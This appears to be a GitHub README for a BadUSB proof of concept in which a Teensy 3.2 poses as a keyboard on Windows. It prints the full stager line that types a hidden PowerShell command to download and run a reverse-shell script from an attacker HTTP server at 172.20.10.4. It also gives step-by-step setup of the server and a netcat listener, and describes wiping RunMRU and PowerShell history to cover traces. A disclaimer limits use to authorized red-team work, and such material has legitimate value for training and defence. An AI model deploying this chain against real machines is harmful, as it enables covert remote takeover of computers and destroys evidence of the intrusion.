<p align="center">
  <img src="assets/logo.png" alt="Teensy 3.2 board" width="280">
</p>

<h1 align="center">Teensy Reverse Shell</h1>

<p align="center">
   <strong>BadUSB proof of concept using a Teensy 3.2 to run a fileless PowerShell reverse shell on Windows.</strong><br>
   <em>For educational and authorized red-team use only. Do not use against systems you do not own or have explicit permission to test.</em>
</p>

<p align="center">
  <a href="https://www.pjrc.com/teensy/teensy32.html"><img alt="Teensy 3.2" src="https://shieldcn.dev/badge/Teensy-3.2-185190.svg?variant=secondary"></a>
  <a href="https://www.pjrc.com/teensy/td_download.html"><img alt="Teensyduino" src="https://shieldcn.dev/badge/Arduino-Teensyduino-00979D.svg?variant=secondary&amp;logo=arduino"></a>
  <a href="https://learn.microsoft.com/powershell/"><img alt="PowerShell 5.1+" src="https://shieldcn.dev/badge/PowerShell-5.1%2B-5391FE.svg?variant=secondary"></a>
  <a href="https://www.microsoft.com/windows"><img alt="Windows 10/11" src="https://shieldcn.dev/badge/Windows-10%2F11-0078D4.svg?variant=secondary"></a>
  <a href="https://github.com/kacigaya/teensy-reverse-shell/blob/main/LICENSE"><img alt="MIT License" src="https://shieldcn.dev/github/license/kacigaya/teensy-reverse-shell.svg?variant=secondary"></a>
</p>

## How It Works

Two parts: a Teensy sketch that acts as a USB keyboard, and a PowerShell reverse shell pulled over HTTP.

### 1. HID Injection (`stager/stager.ino`)

Plug it into a Windows machine and the OS trusts it as a keyboard with no driver prompt. The sketch then:

1. Waits 3 seconds for the OS to recognize the device
2. Hits `Win + R` to open the Run dialog
3. Types the PowerShell one-liner key by key with an 80ms delay so no keystrokes get dropped
4. Hits Enter to run it
5. Waits 5 seconds, opens Run again, and wipes local history

What gets typed:

```stager/stager.ino#L13-L15
const char PAYLOAD[] =
  "powershell -w h -nop -ExecutionPolicy Bypass -c "
  "\"&(IEX (New-Object Net.WebClient).DownloadString('http://172.20.10.4:8080/shell.ps1'))\"";
```

| Flag | Purpose |
|---|---|
| `-w h` | Hides the PowerShell window |
| `-nop` | Skips profile scripts for faster startup and fewer side effects |
| `-ExecutionPolicy Bypass` | Bypasses script execution restrictions |
| `IEX` + `DownloadString` | Downloads and executes `shell.ps1` in memory without touching disk |

### 2. Reverse Shell (`shell.ps1`)

Hosted on the attacker's HTTP server and loaded straight into memory:

1. Opens a TCP connection back to the attacker IP and port (`172.20.10.4:6969`)
2. Reads incoming commands from the socket in a loop
3. Runs each command with `Invoke-Expression` and sends the output back

Because the target initiates an outbound connection, standard inbound firewall rules do not block it.

### 3. Cleanup

Five seconds after launching the shell, the Teensy sends a second Run command to clear traces:

- Deletes the Run dialog history key (`HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`)
- Deletes the PowerShell command history file (`ConsoleHost_history.txt`)

---

## Attack Chain

```
Teensy plugged into target
  -> OS detects device as a USB keyboard
  -> Win + R opens Run dialog
  -> PowerShell stager typed and run in a hidden window
  -> shell.ps1 fetched into memory over HTTP
  -> Target opens outbound TCP connection to port 6969
  -> Interactive shell session established
  -> Teensy wipes RunMRU and PSReadLine history
```

---

## Setup

### Requirements

- Teensy 3.2
- Arduino IDE with the [Teensyduino](https://www.pjrc.com/teensy/td_download.html) add-on
- Board configuration in Arduino IDE:
  - Board: `Teensy 3.2`
  - USB Type: `Keyboard + Mouse + Joystick`
  - Keyboard Layout: `French (AZERTY)` (or match the target machine)
- HTTP server to host `shell.ps1` (e.g. `python3 -m http.server 8080`)
- TCP listener on the attacking machine (e.g. `nc -lvnp 6969`)

### Configuration

Update connection details in both files before flashing or hosting:

- `stager/stager.ino`: update the HTTP server address in `PAYLOAD`
- `shell.ps1`: set `$i` (listener IP) and `$p` (port)

### Steps

1. Start the HTTP server in the directory containing `shell.ps1`
2. Start the TCP listener on the attacking machine
3. Flash `stager.ino` to the Teensy
4. Plug the Teensy into the target Windows machine

---

## Project Structure

```
teensy-reverse-shell/
+-- stager/
|   +-- stager.ino     # Teensy HID keyboard injector
+-- shell.ps1          # PowerShell reverse shell payload
+-- README.md
```
